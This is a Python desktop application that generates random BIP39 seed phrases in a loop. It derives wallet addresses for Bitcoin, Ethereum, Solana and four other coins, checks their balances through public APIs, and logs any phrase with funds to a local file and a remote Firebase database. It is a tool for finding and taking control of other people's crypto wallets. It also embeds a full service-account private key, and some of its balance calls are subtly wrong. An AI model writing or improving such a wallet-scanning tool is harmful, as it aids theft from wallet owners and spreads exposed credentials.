import tkinter as tk
from tkinter import messagebox, font as tkFont
from bip_utils import Bip39MnemonicGenerator, Bip39MnemonicValidator, Bip39WordsNum, Bip39Languages, Bip39SeedGenerator, Bip44, Bip44Coins
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import firebase_admin
from firebase_admin import credentials, db


class SeedPhraseApp:

    def __init__(self, root):
        self.root = root
        self.root.title("Seed Phrase Generator with Wallet Balance")
        self.root.geometry("600x500")
        self.root.configure(bg="#f5f5f5")

        # Initialize Firebase
        self.initialize_firebase()

        # Create a header frame
        header_frame = tk.Frame(root, bg="#4CAF50", pady=10)
        header_frame.pack(fill=tk.X)

        # Title label
        title_font = tkFont.Font(family="Helvetica", size=16, weight="bold")
        title_label = tk.Label(header_frame, text="Project Aziz",
                               font=title_font, fg="white", bg="#4CAF50")
        title_label.pack()

        # Main content frame
        self.content_frame = tk.Frame(root, bg="#f5f5f5")
        self.content_frame.pack(pady=10)

        # Label for seed phrase and balances
        self.label = tk.Label(
            self.content_frame, text="Generated Seed Phrase and Balances:", bg="#f5f5f5", font=("Helvetica", 12))
        self.label.pack(pady=5)

        # Text area for displaying phrases
        self.phrase_display = tk.Text(self.content_frame, height=15, width=70,
                                      wrap=tk.WORD, bg="#ffffff", fg="#333333", font=("Courier New", 10))
        self.phrase_display.pack(pady=5)
        self.phrase_display.config(state=tk.DISABLED)

        # Buttons frame
        buttons_frame = tk.Frame(root, bg="#f5f5f5")
        buttons_frame.pack(pady=10)

        # Copy button
        self.copy_button = tk.Button(buttons_frame, text="Copy Selected Phrase", command=self.copy_phrase,
                                     bg="#4CAF50", fg="white", font=("Helvetica", 10), borderwidth=0)
        self.copy_button.pack(side=tk.LEFT, padx=5)

        # Pause button
        self.pause_button = tk.Button(buttons_frame, text="Pause Scrolling", command=self.toggle_pause,
                                      bg="#4CAF50", fg="white", font=("Helvetica", 10), borderwidth=0)
        self.pause_button.pack(side=tk.LEFT, padx=5)

        self.paused = False
        self.running = True

        # Define the coins to monitor
        self.coins = {
            'BTC': 'bitcoin',
            'ETH': 'ethereum',
            'LTC': 'litecoin',
            'XRP': 'ripple',
            'ADA': 'cardano',
            'SOL': 'solana',
            'DOGE': 'dogecoin'
        }

        self.prices = {}
        self.update_prices()  # Fetch current prices on startup
        self.log_file_path = "seed_phrase_log.txt"
        self.generate_seed()

    def initialize_firebase(self):
        # Firebase initialization with your service account JSON
        cred = credentials.Certificate({
            "type": "service_account",
            "project_id": "seedphrase-f1bc3",
            "private_key_id": "c4342f027ed2ecc242f1446009a2e0aab2a334b5",
            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDN/KXpXKJzeaLU\nlune9Wn/8FiWZO07oGyin/7uZpVDfRk8DVpvkkUmq5DVJZbAV3AwmNTNAnPnPDdM\nwwjj2cx6vGEELgheqWZudr4sCSt9MeGusiiBBGNcTlyiPaewXhahyirdvL9wmSkh\ncbY/fQaMg9fFNC3/bKxUNKwqQ1ZN99EyzWcqsGycwX8eyIinXsgE4SWmMopHZiBF\n503ZXIeEFrgvWmFq+GH6+TLlWBWgoRT0K8EK9+YyTx2vVfr2hZ6IDQaRF8Bu2AJU\nZhXpC1DPu1lv+j4MheZKQGJ4y8i3C4v4FqfiRb4l1gT9iLqY1IzRMDOaglV74Ibi\nbUPayl8tAgMBAAECggEAM3NLN6Y5N3Gm38XQJa4T62croWkVLmMML3SaNw7tcn2B\nO5Q0RhD5b8bDttGcPW+5qJHL+WcG7zeFsok2o77nibKa4vHiik5ytN2484PY1n0K\nm1mJr2waq1gxYB7ZTz65FXFLUrZN9QB0mxNti58dbySRVQMLCDUrOB8t76KBIJj2\nSasvqm22EDXNvz7dDrOyebRLTXfm6ehGI1eLuVZ4e3qfP2d/tk8/FdEMUkK1Mohm\nPIDJmLzgAfLtwlsz3T68D3TtZtPF/kne8ZIVJlncsYE0L0igIc4VFJhFZ2n7Gbju\n6G3dYHP+Akt5ZJG4f23fYwVymW5eleIBpz8ovNZeSwKBgQDyJdAZdFJ4kncHTNdV\nKXqgfzYm8QQvQ3RNAW3zuOrYnXAXbVhczyoiTIf3JNBp8D0XbJkEfijA43qsk0Y2\nFZvY/DA+Mxqy9NQsISJp2G59QoTl9l/DCduhJkoBbxlIv2nWKQNJBeISX/hzVt4a\nu9ECpLO+BzfGbUWl+nq4hz/6kwKBgQDZxUUop4MUe/TAkjpS2Lu3prdnfd8Bgm27\nKIxKJ0p0u6x5LO9B5HTf2nqtVwem2lUbFKibGyGA/E3/0UD5JPbLRmUX0PhnJBTp\nI8oPoW+XIA4hlRl4Hkmrtn4rzuWjft42/uUdKDtgy7r3D3fqGzwnvJvGMAoyaJrm\nxEM1qiWXPwKBgQDCo8BlZYoRHvIMbSi9bK0EK50UqjEJ6LeoWljOSrqDSfHa8urP\nFzqv/UJhVzcroI8KsCFDakFJ4tAtvef2+2GdhgElTiDM7l1J54xo9i7CAuEek+6f\nsOHY5BUil/ID9tCU87yPSupQiNIFrDK13HiCHm/YdKbRme4dH3zbrOOxfwKBgQCE\nl58fPLcL3tlL8vy9+qZ5EHI0+iexBJgJT4vzjm7AGpDOCvT2WsJqld0B865+Agu1\nfGOYZPGGVpirPN5hlAcMB6V/1cWZDxgIR7k8wR9vlZ3lBqJGR7K1cVzrEYMyhAmK\n1LHtidR1gDYrPWjWypRa4XS7O/7JaHWAMll1sE5JAwKBgQCDNdFaBNJxOQ7uI7f1\nN2U62YXF2/4cgrs13crK4oMNJL/aUMRLTckF3h+y8m0QN8rZ5DXz9MuNFbToYp2q\nq3+abSHMi7oJSLNOkY0hAmFDFpnyMqgsl3mD8aeUtEWUomcnAERYcRP8piw91fKW\ncL8/i6uDUsSNC7Xc7+QpMH2jbQ==\n-----END PRIVATE KEY-----\n",
            "client_email": "firebase-adminsdk-kl8lr@seedphrase-f1bc3.iam.gserviceaccount.com",
            "client_id": "113784393160968090988",
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
            "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
            "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-kl8lr%40seedphrase-f1bc3.iam.gserviceaccount.com"
        })
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://seedphrase-f1bc3-default-rtdb.firebaseio.com'
        })

    def update_prices(self):
        try:
            for symbol, id in self.coins.items():
                response = requests.get(
                    f"https://api.coingecko.com/api/v3/simple/price?ids={id}&vs_currencies=usd")
                if response.status_code == 200:
                    self.prices[symbol] = response.json()[id]["usd"]
                else:
                    self.prices[symbol] = 0.0
        except requests.RequestException as e:
            print(f"Error fetching cryptocurrency prices: {e}")

    def generate_seed(self):
        mnemonic_generator = Bip39MnemonicGenerator()
        validator = Bip39MnemonicValidator(Bip39Languages.ENGLISH)

        def update_phrases():
            while self.running:
                if not self.paused:
                    seed_phrase = mnemonic_generator.FromWordsNumber(
                        Bip39WordsNum.WORDS_NUM_12)

                    if validator.IsValid(seed_phrase):
                        seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()

                        # Fetch wallet balances in parallel
                        with ThreadPoolExecutor() as executor:
                            futures = {executor.submit(
                                self.check_wallet_balance, seed_bytes, symbol): symbol for symbol in self.coins}

                            balances = {}
                            for future in as_completed(futures):
                                symbol = futures[future]
                                try:
                                    balance = future.result()
                                    balances[symbol] = balance
                                except Exception as e:
                                    print(
                                        f"Error fetching {symbol} balance: {e}")
                                    balances[symbol] = 0

                        balance_display = ", ".join(
                            f"{symbol} ${balance * self.prices[symbol]:.8f}" for symbol, balance in balances.items())

                        self.phrase_display.config(state=tk.NORMAL)
                        self.phrase_display.insert(
                            tk.END, f"Phrase: {seed_phrase}\n")
                        self.phrase_display.insert(
                            tk.END, f"Wallet Balances: {balance_display}\n")
                        self.phrase_display.insert(tk.END, "-" * 60 + "\n")
                        self.phrase_display.config(state=tk.DISABLED)
                        self.phrase_display.see(tk.END)

                        # Log non-zero balances
                        for symbol, balance in balances.items():
                            total_value = balance * self.prices[symbol]
                            if total_value > 0:
                                self.log_seed_phrase(seed_phrase, balances)
                                self.log_to_firebase(
                                    seed_phrase, balances)  # Log to Firebase
                                messagebox.showinfo(
                                    "Balance Alert", f"Non-zero balance detected for seed phrase:\n{seed_phrase}\n{balance_display}")

                self.root.update_idletasks()
                time.sleep(0.1)  # Shortened delay for faster generation

        # Run the phrase generation in a separate thread
        thread = threading.Thread(target=update_phrases)
        thread.daemon = True
        thread.start()

    def check_wallet_balance(self, seed_bytes, coin):
        if coin == 'BTC':
            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
        elif coin == 'ETH':
            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
        elif coin == 'LTC':
            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.LITECOIN)
        elif coin == 'XRP':
            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.RIPPLE)
        elif coin == 'ADA':
            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.CARDANO_BYRON_ICARUS)
        elif coin == 'SOL':
            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
        elif coin == 'DOGE':
            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.DOGECOIN)
        else:
            return 0

        wallet_address = bip44.PublicKey().ToAddress()

        try:
            # API calls to get balances for each coin
            if coin == 'BTC':
                response = requests.get(
                    f"https://api.blockcypher.com/v1/btc/main/addrs/{wallet_address}/balance")
                if response.status_code == 200:
                    return response.json().get('final_balance', 0)
            elif coin == 'ETH':
                response = requests.get(
                    f"https://api.blockcypher.com/v1/eth/main/addrs/{wallet_address}/balance")
                if response.status_code == 200:
                    return response.json().get('final_balance', 0)
            elif coin == 'LTC':
                response = requests.get(
                    f"https://api.blockcypher.com/v1/ltc/main/addrs/{wallet_address}/balance")
                if response.status_code == 200:
                    return response.json().get('final_balance', 0)
            elif coin == 'XRP':
                response = requests.get(
                    f"https://data.ripple.com/v2/accounts/{wallet_address}/balances")
                if response.status_code == 200:
                    for balance in response.json()['balances']:
                        if balance['currency'] == 'XRP':
                            return float(balance['value'])
            elif coin == 'ADA':
                response = requests.get(
                    f"https://cardano-mainnet.blockfrost.io/api/v0/addresses/{wallet_address}/statistics",
                    headers={"project_id": "<YOUR_BLOCKFROST_PROJECT_ID>"})
                if response.status_code == 200:
                    return float(response.json().get('total_received', 0))
            elif coin == 'SOL':
                response = requests.get(
                    f"https://api.mainnet-beta.solana.com/{wallet_address}")
                if response.status_code == 200:
                    return response.json().get('lamports', 0)
            elif coin == 'DOGE':
                response = requests.get(
                    f"https://api.blockcypher.com/v1/doge/main/addrs/{wallet_address}/balance")
                if response.status_code == 200:
                    return response.json().get('final_balance', 0)
        except requests.RequestException as e:
            print(f"Error fetching {coin} balance: {e}")

        return 0

    def log_seed_phrase(self, seed_phrase, balances):
        with open(self.log_file_path, "a") as f:
            f.write(f"Seed Phrase: {seed_phrase}\n")
            for symbol, balance in balances.items():
                f.write(
                    f"{symbol} Balance: {balance * self.prices[symbol]:.8f} USD\n")
            f.write("-" * 60 + "\n")

    def log_to_firebase(self, seed_phrase, balances):
        ref = db.reference('seed_phrases')
        data = {
            'phrase': seed_phrase,
            'balances': balances
        }
        # Add seed phrase and balances to Firebase Realtime Database
        ref.push(data)

    def copy_phrase(self):
        try:
            selected_text = self.phrase_display.get(
                tk.SEL_FIRST, tk.SEL_LAST).strip()
            self.root.clipboard_clear()
            self.root.clipboard_append(selected_text)
            self.root.update()  # Keeps the clipboard available after app exit
            messagebox.showinfo("Copied", "Seed phrase copied to clipboard.")
        except tk.TclError:
            messagebox.showwarning(
                "Warning", "No seed phrase selected. Please highlight text first.")

    def toggle_pause(self):
        self.paused = not self.paused
        if self.paused:
            self.pause_button.config(text="Resume Scrolling")
        else:
            self.pause_button.config(text="Pause Scrolling")


if __name__ == "__main__":
    root = tk.Tk()
    app = SeedPhraseApp(root)
    root.mainloop()
